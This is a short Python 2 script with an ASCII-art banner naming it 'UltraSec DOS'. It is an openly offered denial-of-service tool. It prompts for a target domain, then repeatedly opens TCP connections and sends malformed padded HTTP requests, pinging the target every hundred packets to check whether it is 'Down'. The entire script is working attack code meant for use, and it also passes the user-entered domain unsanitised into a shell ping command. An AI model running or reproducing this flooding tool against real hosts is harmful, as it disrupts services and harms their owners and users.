from socket import *
import time
from urllib import urlopen
import subprocess

print
print (r'''
 ooooo     ooo oooo      .                       .oooooo..o
`888'     `8' `888    .o8                      d8P'    `Y8
 888       8   888  .o888oo oooo d8b  .oooo.   Y88bo.       .ooooo.   .ooooo.
 888       8   888    888   `888""8P `P  )88b   `"Y8888o.  d88' `88b d88' `"Y8
 888       8   888    888    888      .oP"888       `"Y88b 888ooo888 888
 `88.    .8'   888    888 .  888     d8(  888  oo     .d8P 888    .o 888   .o8
   `YbodP'    o888o   "888" d888b    `Y888""8o 8""88888P'  `Y8bod8P' `Y8bod8P'



oooooooooo.     .oooooo.    .oooooo..o
`888'   `Y8b   d8P'  `Y8b  d8P'    `Y8
 888      888 888      888 Y88bo.
 888      888 888      888  `"Y8888o.
 888      888 888      888      `"Y88b
 888     d88' `88b    d88' oo     .d8P
o888bood8P'    `Y8bood8P'  8""88888P'


Write By : Ashkan Moghddas
Web Site : Ultrasec.org

''')

print

domain = raw_input("\nTarget Domain(example.com)=> ")
port = raw_input("Port(defualt 80)=> ")
t = raw_input ("Time Send Packet=> ")

if port == '':
	port = 80
if t == '':
	t = 1
	
u = urlopen("http://"+domain)
server = dict(u.headers)['server']
ip = gethostbyname(domain)

print
print "[+]ipaddress => ",ip
print "[+]server => ",server
print 

num = 0
count = 100
print "[*] Starting Attack to ",ip,'....\n'

while True:
  s = socket(AF_INET , SOCK_STREAM)
  try:
		s.connect((domain , int(port)))
  except:
		print "\n[!] Not Connected\n"
		exit()
  s.send("GET http://"+domain+" HTTP 1.1\r\n"+"A"*100)
  num = num+1
  if num == count:
		print "\n[*] request ping for check ...\n"
		ping = subprocess.check_output("ping "+domain)
		if "Request Time Out." in ping:
				print "\n[+] please run ping for ",domain,"\nDomian may become is **Down** :)\n"
				raw_input("for send packet again press enter ...\n")
		else:
			pass
		count += 100
		
		
  print "[+] Sendig Packet ",num
  time.sleep(int(t))

s.close()

